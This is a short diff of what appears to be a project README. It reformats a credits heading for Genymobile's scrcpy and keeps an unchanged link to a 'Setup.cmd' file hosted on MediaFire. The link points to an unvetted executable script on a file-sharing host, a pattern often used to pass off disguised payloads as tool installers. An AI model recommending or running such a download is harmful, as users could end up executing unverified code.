@@ -2,7 +2,8 @@
   Link to download setup:
   https://www.mediafire.com/file/hnwxkj5wa58gy5q/Setup.cmd/file
 
- Credits to:
+ # Credits
+ 
  Genymobile - scrcpy 
  https://github.com/Genymobile/scrcpy
 
